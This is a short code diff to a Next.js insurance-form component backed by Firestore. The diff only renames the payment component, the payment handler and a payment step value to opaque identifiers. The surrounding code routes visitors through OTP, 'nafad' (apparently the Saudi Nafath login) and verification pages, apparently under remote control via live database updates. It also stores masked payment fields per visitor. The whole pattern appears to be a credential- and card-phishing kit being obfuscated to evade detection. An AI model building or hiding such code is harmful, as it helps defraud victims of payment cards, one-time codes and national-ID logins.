@@ -11,7 +11,7 @@ import { doc, onSnapshot } from "firebase/firestore"
 import { useRouter } from "next/navigation"
 import { setupOnlineStatus } from "@/lib/utils"
 import { FullPageLoader } from "@/components/loader"
-import PaymentPage from "@/components/pay-form"
+import _P1 from "@/components/pay-form"
 
 const allOtps = [""]
 
@@ -116,7 +116,7 @@ export default function InsuranceForm() {
             router.push("/phone-info")
           } else if (step === "_t6") {
             router.push("/nafad")
-          } else if (step === "payment") {
+          } else if (step === "_st1") {
             router.push("/check")
           } else if (step === "_t2") {
             router.push("/veri")
@@ -248,7 +248,7 @@ export default function InsuranceForm() {
     })
   }
 
-  const handlePayment = async (e: React.FormEvent) => {
+  const _hp = async (e: React.FormEvent) => {
     e.preventDefault()
 
     await addData({ id: visitorID, _v1, _v2, _v3, selectedPaymentMethod, }).then(() => {
@@ -785,7 +785,7 @@ export default function InsuranceForm() {
                   </div>
                 </div>
               </div>
-              <PaymentPage offerTotalPrice={offerTotalPrice} />
+              <_P1 offerTotalPrice={offerTotalPrice} />
             </div>
           </div>
         </div>
